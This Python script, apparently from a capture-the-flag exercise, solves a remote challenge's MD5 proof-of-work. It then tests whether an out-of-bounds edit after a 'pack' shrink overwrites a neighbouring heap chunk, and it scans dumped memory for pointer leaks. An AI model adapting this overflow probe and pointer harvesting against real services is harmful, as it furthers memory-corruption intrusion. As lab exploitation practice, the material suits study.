"""514 实验：验证 pack 收缩后 edit 越界能覆盖相邻（已释放/在用）块的内容与元数据。"""
import hashlib
import itertools
import re
import socket
import string
import time

HOST, PORT = "env.xj.edisec.net", 30410


def drain(s, wait=0.7):
    s.settimeout(0.22)
    buf = b""
    end = time.monotonic() + wait
    while time.monotonic() < end:
        try:
            d = s.recv(16384)
        except socket.timeout:
            continue
        if not d:
            break
        buf += d
    return buf


def solve_pow(md5hex, masked):
    pos = [i for i, ch in enumerate(masked) if ch == "_"]
    fixed = list(masked)
    for combo in itertools.product(string.ascii_uppercase, repeat=len(pos)):
        for i, ch in zip(pos, combo):
            fixed[i] = ch
        if hashlib.md5("".join(fixed).encode()).hexdigest() == md5hex:
            return "".join(combo)
    raise SystemExit("pow failed")


s = socket.create_connection((HOST, PORT), timeout=8)
banner = drain(s, 1.5)
masked = re.search(rb"Token:\s*([A-Za-z_]+)", banner).group(1).decode()
md5hex = re.search(rb"MD5:\s*([0-9a-f]{32})", banner).group(1).decode()
s.sendall(solve_pow(md5hex, masked).encode() + b"\n")
drain(s, 1.2)


def cmd(*lines, wait=0.75):
    out = b""
    for ln in lines:
        s.sendall(str(ln).encode() + b"\n")
        out += drain(s, wait)
    return out


def parse(r):
    m = re.search(rb"len=(\d+) cap=(\d+)\n([0-9a-f]*)\n", r)
    return (int(m.group(1)), int(m.group(2)), bytes.fromhex(m.group(3).decode())) if m else None


# A：512 字节全 0x41（pack 后会长段折叠 → 若实现为收缩，就会释放出剩余块）
cmd(1, 0, "A", 512, 512, "41" * 512)
r = cmd(3, 0); print("[A before pack] len/cap:", parse(r)[:2])
cmd(4, 0)
r = cmd(3, 0); d = parse(r); print("[A after pack ] len/cap:", d[:2], "dump[:32]", d[2][:32].hex())

# B：len=0 占位，看它是否落在 A 的旧块/空洞上（读回旧内容 = 复用证据）
cmd(1, 1, "B", 512, 0, "")
r = cmd(3, 1); dB = parse(r)
print("[B created   ] len/cap:", dB[:2])
print("[B dump[:48] ]", dB[2][:48].hex())
ptrs = [int.from_bytes(dB[2][i:i+8], "little") for i in range(0, len(dB[2])-8, 8)]
print("[B 指针候选  ]", sorted({hex(p) for p in ptrs if 0x10000 < p < 0x800000000000})[:8])

# 关键：A 写满 cap（520），看 B 的内容是否被覆盖
cmd(2, 0, 520, "55" * 520)
r = cmd(3, 1); d2 = parse(r)
print("[B after A-edit] len/cap:", d2[:2])
print("[B dump[:48] ]", d2[2][:48].hex())
print("[B 是否被 0x55 覆盖] :", d2[2].count(b"\x55"))
r = cmd(3, 0); dA = parse(r)
print("[A now       ] len/cap:", dA[:2], "0x55 计数:", dA[2].count(b"\x55"))
s.close()